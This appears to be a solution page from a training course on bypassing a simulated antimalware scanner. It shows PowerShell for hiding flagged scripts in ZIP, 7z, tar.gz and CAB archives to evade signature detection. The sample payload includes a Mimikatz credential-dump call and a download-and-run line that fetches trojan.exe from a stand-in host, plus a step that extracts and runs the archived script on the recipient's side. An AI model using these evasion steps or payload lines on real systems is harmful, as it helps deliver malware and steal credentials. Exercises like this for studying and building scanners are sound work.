---
title: "Solution 19: Archive Container"
challenge_number: 19
difficulty: easy
category: "Non-Printable Ratio Bypass"
permalink: /solutions/19-archive-container/
---

# Solution: Archive Container

[Back to Challenge](../challenges/19-archive-container.md)

## Overview

Place the malicious file inside a ZIP (or other archive format). The scanner reads the archive's raw bytes — which are compressed/structured data — and cannot decompress, parse, or recursively scan the contents. Signatures are destroyed by compression, and the archive format's binary overhead is a flat byte stream to the scanner.

## Working Code

### Basic ZIP Containment

```powershell
# Step 1: Create a clearly malicious file that WOULD be detected
$malicious = @"
# This script contains multiple signatures
Invoke-Mimikatz -DumpCreds
$wc = New-Object System.Net.WebClient
$wc.DownloadFile("http://malware.evil/trojan.exe", "C:\payload.exe")
Start-Process "C:\payload.exe"
"@

Set-Content -Path "malware.ps1" -Value $malicious

# Step 2: Verify it gets detected when scanned directly
# nim_antimalware_sim.exe malware.ps1  → DETECTED

# Step 3: Compress into a ZIP archive
Compress-Archive -Path "malware.ps1" -DestinationPath "innocent.zip" -Force

# Step 4: Clean up the original
Remove-Item "malware.ps1"

# The scanner cannot look inside innocent.zip
Write-Host "Archive created: innocent.zip"
Write-Host "Size: $((Get-Item 'innocent.zip').Length) bytes"
```

### Verifying the Signature is Gone

```powershell
# Read the ZIP's raw bytes - this is what the scanner sees
$zipBytes = [System.IO.File]::ReadAllBytes("innocent.zip")

# Convert to string to search for signatures
$rawText = [System.Text.Encoding]::ASCII.GetString($zipBytes)

# The compressed data destroys the original byte sequences
Write-Host "Contains 'Mimikatz': $($rawText.Contains('Mimikatz'))"
Write-Host "Contains 'malware': $($rawText.Contains('malware'))"
Write-Host "Contains 'trojan': $($rawText.Contains('trojan'))"
# All: False (compression scrambled the bytes)
```

### Alternative: Using .NET ZipArchive for More Control

```powershell
# Create a ZIP with a password-protected entry (extra layer)
Add-Type -AssemblyName System.IO.Compression
Add-Type -AssemblyName System.IO.Compression.FileSystem

$zipPath = "delivery.zip"
$stream = [System.IO.File]::Create($zipPath)
$archive = New-Object System.IO.Compression.ZipArchive($stream, [System.IO.Compression.ZipArchiveMode]::Create)

# Add the malicious file as a compressed entry
$entry = $archive.CreateEntry("readme.ps1", [System.IO.Compression.CompressionLevel]::Optimal)
$writer = New-Object System.IO.StreamWriter($entry.Open())
$writer.Write("Invoke-Mimikatz -DumpCreds; Get-Process malware")
$writer.Close()

$archive.Dispose()
$stream.Close()

Write-Host "ZIP created: $zipPath"
```

### Extraction at Runtime

```powershell
# The recipient extracts and executes
Expand-Archive -Path "innocent.zip" -DestinationPath ".\extracted" -Force
& ".\extracted\malware.ps1"
```

### Other Container Formats That Work

```powershell
# 7-Zip (if available)
& 7z a -t7z payload.7z malware.ps1

# TAR + GZIP
tar -czf payload.tar.gz malware.ps1

# CAB (Windows Cabinet)
makecab malware.ps1 payload.cab
```

## Why It Works

The scanner processes files as **flat byte streams**. It has no archive-awareness:

### What the Scanner Does

```
1. Open file "innocent.zip"
2. Read all bytes into memory as a flat array
3. Scan those bytes for signature strings
4. Calculate non-printable ratio on those bytes
5. Calculate entropy on those bytes
```

### What the Scanner Does NOT Do

```
✗ Recognize ZIP file magic bytes (PK\x03\x04)
✗ Parse the ZIP central directory
✗ Decompress DEFLATE streams
✗ Extract individual files from the archive
✗ Recursively scan contained files
✗ Understand any archive format structure
```

### How Compression Destroys Signatures

ZIP uses DEFLATE compression, which replaces byte sequences with Huffman-coded references. The original string "Invoke-Mimikatz" (hex: `49 6E 76 6F 6B 65 2D 4D 69 6D 69 6B 61 74 7A`) becomes an entirely different byte sequence after compression:

```
Original bytes:  49 6E 76 6F 6B 65 2D 4D 69 6D 69 6B 61 74 7A
After DEFLATE:   CB CC 2B CF 4E D5 F5 CD CC 05 00 (example)
```

The scanner searches for the original signature bytes. They no longer exist in the compressed stream.

### Even Without Compression

Even a "stored" (uncompressed) ZIP entry wraps the content in ZIP file structures:
- Local file header (30+ bytes) inserted before content
- File name field between header and data
- Data descriptor after content
- Central directory at end of archive

These structural bytes **interleave** with and **break** any contiguous signature the scanner might search for.

### Non-Printable Ratio

ZIP files contain a mix of:
- Header structures (some printable, some not)
- Compressed data (mostly non-printable)

For large enough archives, the ratio may exceed 40%. However, the **signature check** is the primary detection mechanism being bypassed. The non-printable ratio flag on a `.zip` file would be a false positive that real-world scanners deliberately avoid.

## How to Verify

1. Create a file with known signatures:
   ```powershell
   Set-Content -Path "detected.ps1" -Value "Invoke-Mimikatz malware trojan"
   ```

2. Verify direct scanning detects it:
   ```
   nim_antimalware_sim.exe detected.ps1
   # Result: DETECTED (signature match)
   ```

3. Archive it:
   ```powershell
   Compress-Archive -Path "detected.ps1" -DestinationPath "safe.zip" -Force
   ```

4. Scan the archive:
   ```
   nim_antimalware_sim.exe safe.zip
   ```

5. Expected result: **No signature detection** — the compressed bytes don't contain the original signature strings.

6. Verify the content is recoverable:
   ```powershell
   Expand-Archive -Path "safe.zip" -DestinationPath ".\verify" -Force
   Get-Content ".\verify\detected.ps1"
   # Output: Invoke-Mimikatz malware trojan (original content intact)
   ```
